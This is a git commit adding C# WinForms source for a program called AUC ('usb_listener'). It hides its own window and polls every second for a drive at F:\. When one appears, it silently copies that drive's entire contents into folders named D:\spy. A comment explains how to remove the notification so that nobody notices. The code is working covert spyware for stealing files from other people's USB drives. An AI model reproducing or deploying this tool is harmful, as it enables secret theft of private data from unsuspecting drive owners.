0786f793246ddaba4fe854b31976d8f8fec94e2d
elminalirzayev <elmin.alirzayev@gmail.com>
2017-03-01 17:34:57 +0400

    Add files via upload

---
+++ AUC.Designer.cs
@@ -0,0 +1,134 @@
+﻿namespace usb_listener
+{
+    partial class AUC
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AUC));
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            this.timer2 = new System.Windows.Forms.Timer(this.components);
+            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
+            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.contextMenuStrip1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // timer1
+            // 
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // notifyIcon1
+            // 
+            this.notifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
+            this.notifyIcon1.BalloonTipText = "Copied";
+            this.notifyIcon1.BalloonTipTitle = "AUC Note";
+            this.notifyIcon1.ContextMenuStrip = this.contextMenuStrip1;
+            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
+            this.notifyIcon1.Text = "AUC";
+            // 
+            // timer2
+            // 
+            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
+            // 
+            // linkLabel1
+            // 
+            this.linkLabel1.AutoSize = true;
+            this.linkLabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.linkLabel1.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(64)))));
+            this.linkLabel1.Location = new System.Drawing.Point(12, 22);
+            this.linkLabel1.Name = "linkLabel1";
+            this.linkLabel1.Size = new System.Drawing.Size(286, 39);
+            this.linkLabel1.TabIndex = 0;
+            this.linkLabel1.TabStop = true;
+            this.linkLabel1.Text = "AUC by TenCode";
+            this.linkLabel1.UseWaitCursor = true;
+            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
+            // 
+            // contextMenuStrip1
+            // 
+            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.startToolStripMenuItem,
+            this.stopToolStripMenuItem,
+            this.exitToolStripMenuItem});
+            this.contextMenuStrip1.Name = "contextMenuStrip1";
+            this.contextMenuStrip1.Size = new System.Drawing.Size(99, 70);
+            // 
+            // exitToolStripMenuItem
+            // 
+            this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
+            this.exitToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
+            this.exitToolStripMenuItem.Text = "Exit";
+            this.exitToolStripMenuItem.Click += new System.EventHandler(this.exitToolStripMenuItem_Click);
+            // 
+            // startToolStripMenuItem
+            // 
+            this.startToolStripMenuItem.Name = "startToolStripMenuItem";
+            this.startToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
+            this.startToolStripMenuItem.Text = "Start";
+            this.startToolStripMenuItem.Click += new System.EventHandler(this.startToolStripMenuItem_Click);
+            // 
+            // stopToolStripMenuItem
+            // 
+            this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
+            this.stopToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
+            this.stopToolStripMenuItem.Text = "Stop";
+            this.stopToolStripMenuItem.Click += new System.EventHandler(this.stopToolStripMenuItem_Click);
+            // 
+            // AUC
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Gray;
+            this.ClientSize = new System.Drawing.Size(308, 82);
+            this.ControlBox = false;
+            this.Controls.Add(this.linkLabel1);
+            this.Name = "AUC";
+            this.ShowInTaskbar = false;
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.contextMenuStrip1.ResumeLayout(false);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+        private System.Windows.Forms.Timer timer2;
+        private System.Windows.Forms.LinkLabel linkLabel1;
+        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
+        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem exitToolStripMenuItem;
+    }
+}
+
---
+++ AUC.cs
@@ -0,0 +1,186 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Management;
+using System.IO;
+using System.Diagnostics;
+
+namespace usb_listener
+{
+    public partial class AUC : Form
+    {
+        public AUC()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {  // Hihing main windows
+            this.Hide();
+            // starting the timer for checking usb port every one second
+            timer1.Interval = 1000;
+            timer1.Start();
+
+            LinkLabel.Link link = new LinkLabel.Link();
+            link.LinkData = "http://www.elminalirzayev.com/";
+            linkLabel1.Links.Add(link);
+        }
+
+        bool isPluged()
+        { //getting all drives
+            DriveInfo[] allDrives = DriveInfo.GetDrives();
+            bool found = false;
+            // getting all drives that is ready
+            foreach (DriveInfo d in allDrives.Where(x => x.IsReady == true))
+            {
+                // is drive name is f . regularly it ll be flash drive 
+
+                if (d.Name == "F:\\")
+                {
+                  
+                    found = true;
+                    break;
+
+                }
+                else
+                {
+                    
+
+                    found = false;
+
+                }
+
+
+            }
+            return found;
+        }
+        // method that copied all files from source directory to destination
+        void Copy(string src, string dest)
+        {
+
+            foreach (string file in Directory.GetFiles(src))
+            {
+                try
+                {
+                    File.Copy(file, Path.Combine(dest, Path.GetFileName(file)));
+                }
+                // catch any other exception that you want.
+                catch (PathTooLongException)
+                {
+                }
+
+            }
+
+            // go recursive on directories
+            foreach (string dir in Directory.GetDirectories(src))
+            {
+
+
+                // First create directory...
+                // Instead of new DirectoryInfo(dir).Name, you can use any other way to get the dir name,
+                // but not Path.GetDirectoryName, since it returns full dir name.
+                string destSubDir = Path.Combine(dest, new DirectoryInfo(dir).Name);
+                Directory.CreateDirectory(destSubDir);
+                // and then go recursive
+                Copy(dir, destSubDir);
+
+
+
+            }
+
+
+        }
+
+        // getting correct directory name that not used 
+        string getDirectoryName()
+        {
+            string d = "D:\\spy";
+            string d2 = "D:\\spy";
+
+
+            int count = 1;
+            while (Directory.Exists(d))
+            {
+                d = d2 + count.ToString();
+                count++;
+            }
+            Directory.CreateDirectory(d);
+            return d;
+        }
+
+        // checking usb drive every second
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            // if we find usb drive
+            if (isPluged())
+            {
+               
+
+                // copiying
+                Copy("F:\\", getDirectoryName());
+
+                //notify that files has alrady copied to destination. you can delete these codes wenn u dont want that someone see this
+                notifyIcon1.Visible = true;
+
+                notifyIcon1.ShowBalloonTip(1000);
+                // disabling checking for 30 seconds
+                timer1.Stop();
+                //starting second timer 
+                timer2.Interval = 1000;
+                timer2.Start();
+
+
+            }
+
+        }
+
+        //after 30 secons it ll be starting checking automaticly
+
+        private int t2 = 0;
+        private void timer2_Tick(object sender, EventArgs e)
+        {
+            t2++;
+            if (t2 == 30)
+            {
+                t2 = 0;
+                timer1.Start();
+                timer2.Stop();
+            }
+        }
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            // visit my website
+            Process.Start(e.Link.LinkData as string);
+        }
+
+        private void startToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            timer1.Start();
+            timer2.Stop();
+            t2 = 0;
+        }
+
+        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            timer1.Stop();
+            timer2.Start();
+            t2 = 0;
+        }
+
+        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+Application.Exit();
+        }
+    }
+
+}
+
+
+
